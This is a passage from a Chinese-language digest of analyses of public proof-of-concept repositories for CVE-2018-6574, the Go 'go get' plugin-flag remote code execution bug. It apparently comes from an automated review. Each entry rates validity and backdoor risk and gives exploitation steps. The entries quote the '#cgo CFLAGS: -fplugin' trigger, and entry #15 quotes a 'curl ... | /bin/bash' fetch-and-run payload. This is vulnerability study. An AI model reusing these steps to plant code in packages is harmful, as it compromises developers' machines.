**项目地址:** [Saboor-Hakimi/CVE-2018-6574](https://github.com/Saboor-Hakimi/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #6

**来源**: [CVE-2018-6574-YoussefSalama1_CVE-2018-6574.md](../2018/CVE-2018-6574-YoussefSalama1_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** Go < 1.8.7, Go 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 受害者需要使用存在漏洞的Go版本执行 `go get` 命令获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Go语言的`go get`命令中，由于在编译过程中没有正确过滤`-fplugin`和`-plugin`参数，导致攻击者可以通过构造包含恶意插件的Go代码仓库，诱使受害者使用存在漏洞的Go版本执行`go get`命令时，执行任意命令。

**有效性分析：**
提供的POC代码展示了如何使用`// #cgo CFLAGS: -fplugin=./attack.so`指令指定一个插件。当使用存在漏洞的Go版本编译该代码时，`attack.so`会被加载，其中的代码会被执行，从而实现远程代码执行。

**投毒风险分析：**
提供的POC代码本身不包含明显的投毒代码，它的目的是演示漏洞利用。`attack.so`的具体内容需要进一步分析才能确定是否存在恶意代码。根据目前的信息，POC代码的投毒风险评估为0%。`main.go`本身的功能是调用`attack.so`中的函数，并打印返回值。 如果`attack.so`存在后门,执行远程命令,则存在高危风险,但此部分分析应当基于其他辅助文件,本分析只针对`main.go`进行。

**利用方式分析：**
1.  攻击者创建一个包含恶意C代码插件（如`attack.so`）的Go代码仓库。
2.  攻击者在Go源代码中使用`// #cgo CFLAGS: -fplugin=./attack.so`指令指定该插件。
3.  攻击者诱使受害者使用存在漏洞的Go版本执行`go get <attacker's repository>`命令。
4.  当Go编译受害者的代码时，会加载并执行`attack.so`中的恶意代码，从而实现远程命令执行。

**项目地址:** [YoussefSalama1/CVE-2018-6574](https://github.com/YoussefSalama1/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #7

**来源**: [CVE-2018-6574-adendarys_CVE-2018-6574.md](../2018/CVE-2018-6574-adendarys_CVE-2018-6574.md)

## CVE-2018-6574-Go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 需要目标系统使用受影响的Go版本，并执行 `go get` 命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于 `go get` 命令中，由于未正确过滤 gcc/clang 的 `-fplugin` 和 `-plugin` 参数，攻击者可以通过构造恶意的 Go 包，在构建过程中执行任意命令。提供的POC代码包含一个 C 文件 (`attack.c`)，该文件编译后生成一个动态链接库 (`attack.so`)，其中包含一个 `malicious()` 函数，该函数在动态链接库加载时自动执行，从而执行系统命令 `/usr/local/bin/score 504b8416-d89e-4980-80ff-7cd7d4605752`。Go 代码 (`main.go`) 使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令在编译时加载该动态链接库，从而触发恶意代码的执行。此POC有效，不存在明显的投毒代码，只是利用该漏洞执行预期的恶意行为。

**利用方式：**

1.  攻击者创建一个包含恶意 C 代码（如 `attack.c`）和 Go 代码（如 `main.go`）的 Go 包。
2.  `attack.c` 编译生成一个包含恶意指令的动态库。恶意指令可以是任意系统命令。
3.  Go 代码使用 `#cgo CFLAGS: -fplugin=./attack.so` 引入包含恶意指令的动态库。
4.  攻击者将该 Go 包发布到公共或私有仓库。
5.  受害者使用 `go get` 命令获取该 Go 包。
6.  在构建过程中，Go 编译器会执行 C 编译指令，加载恶意动态链接库，从而执行攻击者预设的恶意命令，导致远程命令执行。

**项目地址:** [adendarys/CVE-2018-6574](https://github.com/adendarys/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #8

**来源**: [CVE-2018-6574-antunesmpedro_CVE-2018-6574.md](../2018/CVE-2018-6574-antunesmpedro_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程命令执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 使用受影响的 Go 版本执行 `go get` 命令获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过特制的 Go 代码仓库在目标系统上执行任意命令。当用户使用 `go get` 命令获取包含恶意代码的仓库时，Go 构建系统会执行仓库中嵌入的恶意指令。

**有效性：**

提供的 POC 代码是有效的。`exploit.c` 文件包含一个名为 `malicious` 的函数，该函数使用 `system` 函数执行一个命令，在本例中是调用 `/usr/local/bin/score e105a311-4ea5-435a-89a8-770f2cdd2189`。 `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./exploit.so` 指令，该指令指示 go 编译器将 `exploit.so` 编译为插件，并在程序运行时加载它。因为受影响的 Go 版本没有正确阻止 `-fplugin` 和 `-plugin` 参数，所以这允许执行 `exploit.c` 中的恶意代码。

**投毒风险：**

提供的代码片段本身没有明显的投毒行为。`exploit.c` 执行的命令 `/usr/local/bin/score e105a311-4ea5-435a-89a8-770f2cdd2189`  可能用于完成漏洞利用挑战或者其他目的。该命令不是一个常见的恶意行为，因此不应将其判定为投毒。
整个代码仓库的投毒风险评估为 0%，因为提供的代码段没有任何恶意行为，并且没有迹象表明作者试图隐藏恶意代码。

**利用方式：**

1.  攻击者创建一个包含恶意 `exploit.c` 和 `main.go` 文件的 Go 代码仓库。
2.  `exploit.c` 文件包含需要在目标系统上执行的恶意代码。
3.  `main.go` 文件包含 `#cgo CFLAGS: -fplugin=./exploit.so` 指令，从而利用漏洞。
4.  攻击者诱骗目标用户使用 `go get` 命令获取恶意仓库。
5.  当用户执行 `go get` 命令时，Go 构建系统会编译并加载 `exploit.so` 插件，从而执行 `exploit.c` 中的恶意代码。
6. 目标系统受到攻击，攻击者可以在目标系统上执行任意命令。

**项目地址:** [antunesmpedro/CVE-2018-6574](https://github.com/antunesmpedro/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #9

**来源**: [CVE-2018-6574-bme2003_CVE-2018-6574.md](../2018/CVE-2018-6574-bme2003_CVE-2018-6574.md)

## CVE-2018-6574-go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 目标系统使用存在漏洞的Go版本，且执行了`go get`命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过 `go get` 命令执行任意代码。漏洞原因是 Go 在构建源代码时，没有正确阻止 `-fplugin=` 和 `-plugin=` 参数，攻击者可以利用 gcc 或 clang 的插件功能执行恶意代码。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意代码的 Go 包，其中包含一个 `attack.c` 文件和一个 `main.go` 文件。
2.  `attack.c` 文件包含一个 `malicious()` 函数，该函数使用 `system()` 函数执行任意命令。在给定的POC中，执行的命令是`/usr/local/bin/score a10c7b12-8910-4f65-8cd4-a6e57d90686b`。  这个命令很可能是用于提交漏洞利用结果的评分系统。
3.  `main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令告诉 Go 编译器将 `attack.c` 编译为共享库 `attack.so`，并将其作为插件加载。
4.  当用户使用 `go get` 命令获取该恶意包时，Go 编译器会自动编译并加载插件，从而执行 `malicious()` 函数中的恶意代码。

**有效性：**

提供的POC代码有效。`main.go`文件中的`// #cgo CFLAGS: -fplugin=./attack.so`指示了利用方式，即通过`go get`拉取代码时，会编译并加载`attack.so`，从而执行预设的恶意代码。

**投毒风险：**

分析POC代码后，没有发现明显的投毒代码。`attack.c` 中的 `system()` 函数执行的命令是明确的，该POC没有包含其他隐藏的恶意行为。因此，投毒风险评估为0%。虽然执行了恶意命令，但这属于漏洞验证所需的操作，不应被视为投毒。


**项目地址:** [bme2003/CVE-2018-6574](https://github.com/bme2003/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #10

**来源**: [CVE-2018-6574-chr1sM_CVE-2018-6574.md](../2018/CVE-2018-6574-chr1sM_CVE-2018-6574.md)

## CVE-2018-6574

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，允许远程命令执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 使用受影响的Go版本，且执行`go get`命令获取恶意代码仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574漏洞允许攻击者在`go get`命令执行过程中进行远程命令执行。漏洞原理是由于受影响的Go版本未正确过滤`-fplugin`和`-plugin`参数，攻击者可以构造包含恶意插件的Go项目，当用户使用`go get`获取并构建该项目时，恶意插件会被执行，从而实现远程命令执行。

**有效性评估：**
提供的PoC代码由两部分组成：`attack.c`和`golan.go`。`attack.c`包含一个`malicious()`函数，该函数使用`__attribute__((constructor))`修饰，表明该函数会在程序加载时自动执行。该函数的功能是执行`/usr/local/bin/score 3b9e2681-04f3-4771-b576-05baa2a7523f`命令。`golan.go` 是一个简单的 Go 程序，它调用 C 代码。通过组合这两个文件，攻击者可以创建一个恶意的 Go 包，当用户使用易受攻击的 `go get` 版本获取该包时，`attack.c` 中的恶意代码将被编译并执行，从而导致命令执行。

**投毒风险评估：**
提供的代码片段中，`attack.c` 执行了一个特定的命令`/usr/local/bin/score 3b9e2681-04f3-4771-b576-05baa2a7523f`，可以判定为漏洞验证代码，目的是为了验证漏洞是否存在。此命令本身可能与漏洞作者相关，但它不属于隐藏的、未公开的恶意行为，可以认为不存在投毒。因此投毒风险为0%。

**利用方式：**
1.  攻击者创建一个恶意的Go项目，其中包含`attack.c`和`golan.go`文件。
2.  `attack.c`包含恶意代码，例如执行任意命令。
3.  在Go项目的构建过程中，通过`-fplugin`或`-plugin`参数指定`attack.c`编译生成的插件。
4.  攻击者将恶意Go项目托管在公开的代码仓库中。
5.  诱导用户使用受影响的Go版本执行`go get`命令获取该恶意Go项目。
6.  当`go get`构建项目时，恶意插件会被加载并执行，从而实现远程命令执行。

**项目地址:** [chr1sM/CVE-2018-6574](https://github.com/chr1sM/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #11

**来源**: [CVE-2018-6574-currently-unkwn_CVE-2018-6574.md](../2018/CVE-2018-6574-currently-unkwn_CVE-2018-6574.md)

## CVE-2018-6574-Golang go get RCE

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Golang

**危害等级:** 高危，允许攻击者在受害者机器上执行任意命令

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 目标使用受影响的Golang版本，并且尝试使用`go get`命令获取包含恶意C代码的项目。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-6574漏洞允许攻击者通过`go get`命令执行远程代码。该漏洞源于Go语言在构建过程中未正确过滤`-fplugin`和`-plugin`参数，导致可以加载恶意的GCC/Clang插件。攻击者可以构造包含恶意C代码的Go项目，当受害者使用`go get`命令获取该项目时，恶意代码会被编译并执行。

**有效性：**

提供的POC代码有效。`main.go`文件通过`// #cgo CFLAGS: -fplugin=./attack.so`指令指定了要加载的插件`attack.so`。`attack.so`文件（未提供，但推测是恶意payload）会被编译并加载，从而执行恶意代码。

**投毒风险：**

代码仓库中可能存在投毒代码的风险，但从给出的`main.go`和`README.md`内容来看，直接的投毒证据并不明显。`main.go`本身只是加载一个插件，恶意代码应该位于`attack.so`中，而这个文件并没有提供。 投毒风险评估为20%是因为攻击者可以将恶意 payload 隐藏在编译后的 `attack.so` 里, 用户下载后编译并不会感知恶意代码的存在, 存在一定风险。

**利用方式：**

1.  攻击者创建一个包含恶意C代码（编译为`.so`文件）的Go项目。
2.  Go项目的源码中，使用`// #cgo CFLAGS: -fplugin=./attack.so`指令指定要加载的恶意插件。
3.  攻击者将该项目托管在公共代码仓库（如GitHub）上。
4.  受害者使用`go get <attacker_repo>`命令尝试获取该项目。
5.  Go在构建项目时，会加载攻击者指定的恶意插件，从而在受害者机器上执行任意代码。
6.  防御措施包括升级到不受影响的Go版本，或配置Go工具链以禁止加载第三方插件。

**项目地址:** [currently-unkwn/CVE-2018-6574](https://github.com/currently-unkwn/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #12

**来源**: [CVE-2018-6574-elw0od_PentesterLab.md](../2018/CVE-2018-6574-elw0od_PentesterLab.md)

## CVE-2018-6574-go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标机器使用受影响的Go版本，并尝试使用`go get`获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者在 `go get` 命令执行期间利用 gcc 或 clang 插件功能执行远程命令。漏洞原因是 Go 语言未阻止 `-fplugin=` 和 `-plugin=` 参数。提供的POC代码包含一个 `attack.c` 文件，该文件定义了一个名为 `malicious` 的函数，该函数在库加载时自动执行，执行 `/usr/local/bin/score 42689c33-83ff-47d2-b538-ac6931adc5d3` 命令。`main.go` 文件使用 cgo 来编译和链接 `attack.c` 文件，并通过 `#cgo CFLAGS: -fplugin=./attack.so` 指定了 gcc 插件。当执行 `go get` 获取包含此代码的仓库时，`attack.so` 会被编译并加载，导致 `malicious` 函数执行。由于 POC 代码的功能是执行预期的后门命令，因此**没有证据表明存在额外的投毒代码**。POC 的意图是展示漏洞，而不是隐藏恶意行为。

**漏洞利用方式：**
1.  攻击者创建一个包含恶意 `attack.c` 和 `main.go` 的 Go 项目。
2.  攻击者将该项目托管在可公开访问的仓库中。
3.  攻击者诱使用户（开发者）使用受影响的 Go 版本执行 `go get <attacker_repo>` 命令。
4.  当 `go get` 执行时，cgo 编译并链接 `attack.c`，导致 `malicious` 函数执行，从而在目标机器上执行任意命令。


**项目地址:** [elw0od/PentesterLab](https://github.com/elw0od/PentesterLab)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #13

**来源**: [CVE-2018-6574-faiqu3_cve-2018-6574.md](../2018/CVE-2018-6574-faiqu3_cve-2018-6574.md)

## CVE-2018-6574 Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标机器需要安装受影响的Go版本，并执行`go get`命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者通过利用 `go get` 命令在构建源代码期间执行远程命令。该漏洞源于 Go 在处理 gcc 或 clang 插件特性时，未正确阻止 `-fplugin=` 和 `-plugin=` 参数。攻击者可以通过创建一个包含恶意插件的 Go 包，并在该包的源码中指定使用该插件，当受害者使用 `go get` 获取并构建该包时，恶意插件将被加载和执行，从而实现远程命令执行。

**有效性：**
提供的POC代码看起来是有效的。`attack.c` 包含执行命令 `/usr/local/bin/score 3071f0cf-6174-4749-8ae3-fc6da33ec98b` 的恶意代码。`main.go` 使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令，指示 go 编译器在构建时加载 `attack.so` 插件，从而执行 `attack.c` 中的恶意代码。`exploit.html` 可能是该漏洞的补充利用，通过打开一个URL，并向其postMessage，目的是为了触发漏洞利用。

**投毒风险：**
从提供的代码来看，不存在明显的投毒行为。`attack.c` 的目的明确是执行预定义的命令，这属于漏洞利用的一部分，而不是隐藏的恶意代码。`main.go` 明确指定加载该恶意插件。所以投毒风险评估为 0%。

**利用方式：**
1.  攻击者创建一个包含恶意插件的 Go 包（例如，`attack.c` 编译后的 `attack.so`）。
2.  攻击者创建一个 `main.go` 文件，其中使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令加载恶意插件。
3.  攻击者将该 Go 包托管在一个公开可访问的 Git 仓库或其他代码托管平台。
4.  攻击者诱骗受害者使用 `go get` 命令获取并构建该恶意 Go 包。
5.  当受害者执行 `go get` 命令时，Go 编译器将加载并执行恶意插件，从而执行攻击者预先设定的命令。

**项目地址:** [faiqu3/cve-2018-6574](https://github.com/faiqu3/cve-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #14

**来源**: [CVE-2018-6574-faqihudin13_CVE-2018-6574.md](../2018/CVE-2018-6574-faqihudin13_CVE-2018-6574.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go < 1.8.7, Go 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 用户使用受影响的Go版本执行`go get`命令获取恶意代码仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过控制`go get`获取的代码仓库，利用gcc/clang插件机制注入恶意代码，从而在编译时执行任意命令。 

**漏洞利用方式：**

1.  攻击者创建一个包含恶意代码的Go项目，该项目包含一个C文件 (`attack.c`) 和一个Go文件 (`main.go`)。
2.  `attack.c` 文件包含在编译时执行任意命令的代码。在这个例子中，它执行 `/usr/local/bin/score 9d8dad5f-cda0-45bd-b004-219ca9c1774c`。这个命令可能用于漏洞评分或执行恶意操作。
3.  `main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 注释指示 `go` 编译器使用 `attack.c` 生成的插件。 这会强制 `go` 在构建过程中加载并执行该插件。
4.  当用户使用易受攻击的 Go 版本运行 `go get <attacker_repo>`时，`go` 命令会自动下载并构建恶意项目。
5.  由于 `-fplugin` 标志未被正确过滤，`go` 编译器将加载并执行恶意插件，从而在用户的系统上执行攻击者指定的任意命令。

**有效性评估：**

提供的PoC代码有效，它演示了如何在 `go get` 命令执行期间利用 gcc/clang 插件功能执行任意命令。

**投毒风险评估：**

在此特定仓库中，未发现明显的投毒代码。`attack.c` 中执行的命令 `/usr/local/bin/score 9d8dad5f-cda0-45bd-b004-219ca9c1774c` 本身就是漏洞验证的一部分，旨在证明可以执行任意命令。没有迹象表明作者试图隐藏其他恶意代码或功能。因此，投毒风险评估为 0%。

**总结：**

该漏洞利用了 `go get` 命令在处理 gcc/clang 插件参数时的不当输入验证。攻击者可以通过创建一个包含恶意插件的Go项目来利用此漏洞，当用户使用易受攻击的Go版本获取并构建该项目时，该插件将被加载并执行，从而导致远程命令执行。

**项目地址:** [faqihudin13/CVE-2018-6574](https://github.com/faqihudin13/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #15

**来源**: [CVE-2018-6574-frozenkp_CVE-2018-6574.md](../2018/CVE-2018-6574-frozenkp_CVE-2018-6574.md)

## CVE-2018-6574-go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 需要目标机器安装受影响版本的Go，且执行`go get`命令

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许攻击者在受害者构建源代码时执行远程命令。漏洞原因是 `go get` 命令没有正确过滤 gcc 或 clang 插件的参数 `-fplugin=` 和 `-plugin=`。攻击者可以通过构造包含恶意插件选项的 Go 项目，诱导受害者使用 `go get` 命令获取并构建该项目，从而执行任意命令。

**有效性：**

根据漏洞描述和提供的POC代码，漏洞利用的有效性较高。POC代码通过 `#cgo` 指令设置编译选项，利用 `-fplugin` 选项加载恶意的动态链接库，从而在编译时执行预定义的命令。根据`pentesterlab.com/exercises/cve-2018-6574`中的描述，攻击者可以诱骗用户安装恶意包从而执行代码。

**投毒风险：**

该仓库中存在一定的投毒风险，但风险较低。`README.md` 中说明了漏洞利用方式，并明确表示仅用于评估目的。虽然包含了一个`curl`命令，但该命令相对简单，易于检测，攻击者可能通过其他方式进行恶意行为，例如植入更隐蔽的后门程序。该curl命令从外部源获取并执行脚本，存在被篡改的可能。综合考虑，投毒风险大约为10%。

**利用方式：**

1.  攻击者创建一个包含恶意代码的Go项目，该项目使用`#cgo`指令，在编译选项中包含`-fplugin=`或`-plugin=`，指向一个包含恶意代码的动态链接库（如 `calc.so` 或 `calc_darwin.so`）。
2.  攻击者将该项目托管在一个公开的Git仓库中。
3.  攻击者诱导受害者使用受影响版本的Go执行`go get <攻击者仓库地址>`命令。
4.  当`go get`命令构建项目时，会执行恶意动态链接库中的代码，从而实现远程命令执行。
5.  POC中，`calc_darwin.so`（或者其他平台的 `.so` 文件）被设计为执行 `curl newton.cycarrier:8002 | /bin/bash`，这意味着它会从攻击者的服务器下载并执行一个Shell脚本。

**项目地址:** [frozenkp/CVE-2018-6574](https://github.com/frozenkp/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #16

**来源**: [CVE-2018-6574-hasharmujahid_CVE-2018-6574-go-get-RCE.md](../2018/CVE-2018-6574-hasharmujahid_CVE-2018-6574-go-get-RCE.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者使用存在漏洞的Go版本，并使用`go get`命令获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574漏洞允许攻击者在受害者的系统上执行任意命令。攻击者可以通过创建一个包含恶意代码的Go包来实现这一点。当受害者使用`go get`命令获取并构建该包时，恶意代码将被执行。漏洞利用方式如下：

1.  **利用方式:**
    *   攻击者创建一个包含恶意`attack.c`和`main.go`文件的Go包。
    *   `attack.c` 文件包含在编译时执行系统命令的代码，例如，调用 `system("/usr/local/bin/score 173b6b3c-5d6a-4237-b67f-e97ff771ae51")`。
    *   `main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令，指示 `go build` 使用 `attack.so` 作为 gcc 插件。这允许攻击者在构建过程中执行 `attack.c` 中的代码。
    *   攻击者将此Go包托管在公共代码仓库（例如GitHub）上。
    *   攻击者诱骗受害者使用 `go get` 命令获取并构建该恶意包。例如：`go get github.com/attacker/malicious_package`。
    *   当受害者执行 `go get` 命令时，`attack.c` 中的恶意代码将被执行，从而允许攻击者在受害者的系统上执行任意命令。

2.  **有效性:**
    *   提供的PoC代码有效。`attack.c`文件编译为共享库，并通过`main.go`中的`cgo`指令在构建时加载执行，从而实现远程命令执行。

3.  **投毒风险:**
    *   此仓库中未发现作者隐藏的投毒代码。该PoC的目的是演示漏洞利用，而不是在正常功能之外执行恶意行为。`attack.c` 中执行的 `system` 命令可以被修改为任何攻击者想要执行的命令，但目前的代码仅调用了一个看起来是用于获取分数的命令 `score`。 投毒风险为0%。

**项目地址:** [hasharmujahid/CVE-2018-6574-go-get-RCE](https://github.com/hasharmujahid/CVE-2018-6574-go-get-RCE)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #17

**来源**: [CVE-2018-6574-iNoSec2_cve-2018-6574.md](../2018/CVE-2018-6574-iNoSec2_cve-2018-6574.md)

## CVE-2018-6574

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** Go < 1.8.7, Go 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 用户使用go get命令获取包含恶意代码的包

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者在受害者使用 `go get` 命令获取恶意 Go 包时执行任意代码。该漏洞的根源在于 `go get` 命令在构建过程中没有正确过滤 gcc/clang 的插件参数，导致攻击者可以通过 `-fplugin=` 或 `-plugin=` 参数指定恶意插件，从而执行任意代码。

**有效性：**

提供的 POC 代码是有效的，它通过创建一个包含恶意 C 代码（`2018.c`）的 Go 包来实现远程代码执行。恶意 C 代码使用 `__attribute__((constructor))` 在库加载时自动执行 `malicious()` 函数，该函数执行 `/usr/local/bin/score 0634e7ff-26c1-4d5e-817e-a214be2151b7` 命令。 `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令告诉 Go 编译器在构建时加载 `attack.so` 插件（通过编译 `2018.c` 得到）。

**投毒风险：**

该POC代码本身就是一个漏洞演示，旨在展示如何利用该漏洞执行任意命令。`2018.c` 中执行的 `/usr/local/bin/score 0634e7ff-26c1-4d5e-817e-a214be2151b7` 命令是预期的payload。该代码仓库的目的是演示漏洞，而不是为了植入后门。因此投毒风险评估为0%。

**利用方式：**

1.  **创建恶意Go包:** 攻击者创建一个包含恶意 C 代码和 Go 代码的 Go 包。恶意 C 代码编译成一个共享库（`attack.so`）。
2.  **上传恶意Go包:** 攻击者将恶意 Go 包上传到公共代码托管平台（如 GitHub）。
3.  **诱骗受害者:** 攻击者诱骗受害者使用 `go get` 命令获取恶意 Go 包。
4.  **执行恶意代码:** 当受害者使用 `go get` 命令获取恶意 Go 包时，Go 编译器会加载恶意共享库，并执行其中的恶意代码。

**缓解措施：**

*   升级 Go 版本到受影响版本之外（>= 1.8.7, >= 1.9.4, >= 1.10rc2）。
*   避免使用来自不受信任来源的 Go 包。


**项目地址:** [iNoSec2/cve-2018-6574](https://github.com/iNoSec2/cve-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #18

**来源**: [CVE-2018-6574-jahwni_CVE-2018-6574.md](../2018/CVE-2018-6574-jahwni_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者使用存在漏洞的Go版本执行 `go get` 命令来获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许通过 `go get` 命令执行远程代码。攻击者可以创建一个包含恶意代码的Go包，并将该包托管在公开的存储库中。当受害者使用 `go get` 命令获取该包时，恶意代码将在构建过程中执行。利用方式为在包中利用 gcc 或 clang 的插件功能（`-fplugin=` 或 `-plugin=` 参数），在编译时执行任意命令。

提供的PoC代码包含两个文件：`attack.c` 和 `main.go`。
*   `attack.c` 文件包含一个名为 `malicious` 的函数，该函数使用 `system` 函数执行命令 `/usr/local/bin/score 356f5d20-43e8-4a8c-b024-f1e42ec7f7f5`。`__attribute__((constructor))` 确保 `malicious` 函数在共享库加载时自动执行。
*   `main.go` 文件使用 cgo 特性。`// #cgo CFLAGS: -fplugin=./attack.so`  指示 `go` 编译器在构建过程中将 `attack.so` 作为 gcc/clang 插件加载。由于 `attack.so` 包含 `malicious` 函数，因此当 `go get` 获取并构建这个包时，`malicious` 函数将被执行，从而实现远程命令执行。

有效性：提供的PoC代码是有效的，如果目标Go版本存在漏洞，则可以成功执行任意命令。

投毒风险：提供的 PoC 仅仅是漏洞演示，执行了一个固定的命令。从提供的 `attack.c` 和 `main.go` 代码来看，并没有发现隐藏的、额外的恶意代码或者后门。作者意图是演示漏洞，而不是进行恶意攻击，风险较低。

利用方式：
1.  攻击者创建一个包含恶意代码的Go包，如提供的PoC代码。
2.  攻击者将该包托管在公开的存储库中。
3.  攻击者诱使受害者使用存在漏洞的Go版本执行 `go get <attacker_repo>` 命令来获取该包。
4.  当受害者执行 `go get` 命令时，恶意代码将在构建过程中执行，从而实现远程命令执行。

**项目地址:** [jahwni/CVE-2018-6574](https://github.com/jahwni/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #19

**来源**: [CVE-2018-6574-jftierno_-CVE-2018-6574.md](../2018/CVE-2018-6574-jftierno_-CVE-2018-6574.md)

## CVE-2018-6574

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，可能导致完全控制受影响的系统

